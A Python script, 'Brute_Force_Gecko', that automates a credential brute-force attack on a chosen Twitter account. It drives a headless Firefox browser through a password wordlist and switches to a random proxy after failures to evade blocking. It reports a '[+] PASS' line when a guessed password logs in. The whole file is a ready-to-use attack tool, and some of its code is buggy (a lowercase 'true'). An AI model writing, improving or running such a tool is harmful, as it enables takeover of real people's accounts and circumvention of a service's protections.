#importing modules
from selenium import webdriver
from selenium.webdriver import FirefoxOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from proxylist import ProxyList
import time
import sys
import os

#-------------------------------------------------------------------------
# Cute Shima Enaga
print('''\033[1;93m
                 _-```````````````._ 
             _.-`                   `-. 
           -/                          \ 
         -/                             \ 
        /                                \ 
       /                     0      0     \ 
      /   _.-._                  w         \ 
     /_,-`     `-._                         \ 
    |     _.-._     `-.                      ` 
    |._,-`     `-._,-` `-.                    \ 
  ,/      _.-._       _.-.|                    ` 
,/ `-._,-`     `-._,-`    ;                     \ 
|._       _.-._       _.-./                     ` 
|  `-._,-`     `-._,-`   /                      / 
 \_       _.-._     _.--`                      / 
  `\-._,-`    _.--``                          / 
   `--------``                               / 
     `.                                   ,-` 
       `-----,,......_                 _,` 
        v1.0         || -------------``|| 
        *============AA================AA====* 
        |    Demon  : Brute_Force_Gecko      | 
        |    Author : БЛУЕ-ЧАП-САМЕ          | 
        |    Date   : 7 April, 2021          | 
        *====================================* 
\033[1;93m''')

#-------------------------------------------------------------------------
# User input
print("\033[1;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;93m")
username = input('\033[1;37muser : \033[1;37m')
passwordList = input('\033[1;37mpassword : \033[1;37m')
proxyList = input('\033[1;37mproxy : \033[1;37m')
print("\033[1;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;93m")

#-------------------------------------------------------------------------
# Webdriver FireFox Bot Class
class WebFoxBot:
    # create headless firefox browser
    def __init__(self):
        self.opts = FirefoxOptions()
        self.opts.add_argument("--headless")
        self.browser = webdriver.Firefox(options=self.opts)
        time.sleep(1)

    def shutdown(self):
        self.browser.quit()
        
    # set FoxBot using ssl(https) proxy
    def setProxy(self, address):
        try:
            self.browser.quit()
            self.firefox_capabilities = webdriver.DesiredCapabilities.FIREFOX.copy()
            self.firefox_capabilities['proxy'] = {
                "sslProxy": address,
                "proxyType": "MANUAL",
            }
            print("\033[1;37mConnect proxy: {}\033[1;37m".format(address))
            self.browser = webdriver.Firefox(options=self.opts, desired_capabilities=self.firefox_capabilities)
            time.sleep(5)
        except Exception as e:
            print("\033[1;31m[!] Error_setProxy: \033[1;31m",e)
            raise

    # print current proxy from api.ipify.org
    def printProxy(self):
        try:
            self.browser.get("https://api.ipify.org/?format=raw")
            time.sleep(5)
            element = WebDriverWait(self.browser, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "pre"))
            )
            print("\033[1;36mapi.ipify.org: {}\033[1;36m".format(element.text))
        except TimeoutException as e:
            print("\033[1;31m[!] WebDriverWait Timeout \033[1;31m")
            raise e
        except NoSuchElementException as e:
            print("\033[1;31m[!] WebDriver Element 404 \033[1;31m")
            raise e
        except Exception as e:
            print("\033[1;31m[!] Error_printProxy: \033[1;31m",e)
            raise
        finally:
            self.browser.delete_all_cookies()
            
    # login to twitter
    def loginTwitter(self,username, password):
        try:
            self.browser.get("https://twitter.com/login")
            time.sleep(5)
            login_h1 = WebDriverWait(self.browser, 10).until(
                EC.presence_of_element_located((By.XPATH, "//*[@id='react-root']/div/div/div[2]/main/div/div/div/h1/span"))
            )
            print("\033[1;38mtwitter.com: {}\033[1;38m".format(login_h1.text))
            username_input_name = self.browser.find_element_by_name("session[username_or_email]")
            password_input_name = self.browser.find_element_by_name("session[password]")
            username_input_name.send_keys(username)
            password_input_name.send_keys(password)
            login_button = self.browser.find_element_by_xpath("//*[@id='react-root']/div/div/div[2]/main/div/div/div[2]/form/div/div[3]/div")
            print("\033[1;38mtwitter.com: {}\033[1;38m".format(login_button.text))
            login_button.click()
            time.sleep(10)
            login_status= self.browser.find_element_by_xpath("//*[@id='react-root']/div/div/div[2]/main/div/div/div/div/div/div/div/div/div")
            print("\033[1;38mtwitter.com: {}\033[1;38m".format(login_status.text))
            if login_status.text == "Home":
                print(f'\n\033[1;93m [+] PASS [{username}]:[{password}] [+] \033[1;93m')
                return true
        except TimeoutException as e:
            print("\033[1;31m[!] WebDriverWait Timeout \033[1;31m")
            raise e
        except NoSuchElementException as e:
            print("\033[1;31m[!] WebDriver Element 404 \033[1;31m")
            raise e
        except Exception as e:
            print("\033[1;31m[!] Error_loginTwitter: \033[1;31m",e)
            raise
        finally:
            self.browser.delete_all_cookies()

#-------------------------------------------------------------------------
# fox proxy by proxyList
def proxy():
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        fox.shutdown()
        sys.exit('\033[1;31m[!] Proxy File format incorrect | EXIT...\033[1;31m')
    try:
        fox.setProxy(pl.random().address())
        time.sleep(5)
        fox.printProxy()
    except Exception as e:
        print("\033[1;31m[!] RETRY NEW PROXY...\033[1;31m")
        return proxy()

# fox Twitter login brute loop
def Twitter():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("\033[1;38mTarget Account: {}\033[1;38m".format(username))
    for password in password:
        print("-----------------------------------------------")
        print("\033[1;38m[-] {} [-]\033[1;38m".format(password))
        try:
            if fox.loginTwitter(username,password) :
                break
        except Exception as e:
            print("\033[1;31m[!] RETRY NEW PROXY...\033[1;31m")
            proxy()
        except KeyboardInterrupt:
            print("\033[1;31mUSER EXIT\033[1;31m")
            break

#-------------------------------------------------------------------------
# main
if __name__ == '__main__':
    fox=WebFoxBot()
    proxy()
    Twitter()
    fox.shutdown()
